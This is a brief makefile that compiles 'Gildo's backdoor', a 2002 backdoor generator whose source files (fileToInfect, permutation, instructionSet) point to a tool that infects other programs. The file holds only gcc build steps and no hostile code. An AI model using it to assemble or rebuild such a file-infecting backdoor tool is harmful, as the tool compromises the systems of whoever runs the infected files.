
# makefile for Gildo's backdoor
# Gildo backdoor generator is copyright (C) 2002 Mauro Meneghin.
# All rights reserved. The software is redistributable under
# the licence given in the file "Licence" distributed in the
# Gbkdoor archive.


CC=gcc
BINARY=Gbkdoor   #Gildo BacKDOOR
SOURCES=fileToInfect.C opcode.C pool.C backdoor.C chunk.C list.C permutation.C instructionSet.C list/list1.C list/list2.C

all:
	@echo "hello, compiling files"
	$(CC) $(SOURCES) -o $(BINARY)	
	@echo "created binary file $(BINARY)"

